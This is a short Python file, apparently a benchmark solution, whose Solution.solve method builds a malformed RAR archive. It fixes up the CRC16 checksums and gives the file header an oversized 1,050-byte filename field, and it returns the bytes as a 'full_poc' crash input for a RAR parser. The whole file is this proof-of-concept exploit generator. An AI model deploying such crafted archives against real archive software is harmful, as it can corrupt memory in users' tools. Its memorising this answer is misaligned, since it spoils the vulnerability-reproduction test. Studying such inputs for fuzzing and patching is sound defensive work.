class Solution:
    def _crc16(self, data: bytes) -> bytes:
        crc = 0
        for byte in data:
            crc ^= (byte << 8)
            for _ in range(8):
                if crc & 0x8000:
                    crc = ((crc << 1) & 0xFFFF) ^ 0x1021
                else:
                    crc = (crc << 1) & 0xFFFF
        return bytes([crc & 0xFF, crc >> 8])

    def solve(self, src_path: str) -> bytes:
        magic = b'Rar!\x1a\x07\x00'
        sig_crc = self._crc16(magic)
        sig_part = magic + sig_crc
        mark_head = b'\x73\x00\x00\x07'
        host_os = b'\x01'
        method = b'\x30'
        file_time = b'\x00' * 4
        file_crc_field = b'\x00' * 4
        unp_size = b'\x00' * 8
        fixed_data = host_os + method + file_time + file_crc_field + unp_size
        M = 1050
        name_data = b'\x00' * M
        header_size = 22 + M
        size_bytes = bytes([header_size & 0xFF, header_size >> 8])
        type_b = b'\x30'
        flags_b = b'\x00'
        block_content = type_b + flags_b + size_bytes + fixed_data + name_data
        file_block_crc = self._crc16(block_content)
        file_block = file_block_crc + block_content
        headers_part = mark_head + file_block
        arch_crc = self._crc16(headers_part)
        full_poc = sig_part + arch_crc + headers_part
        return full_poc
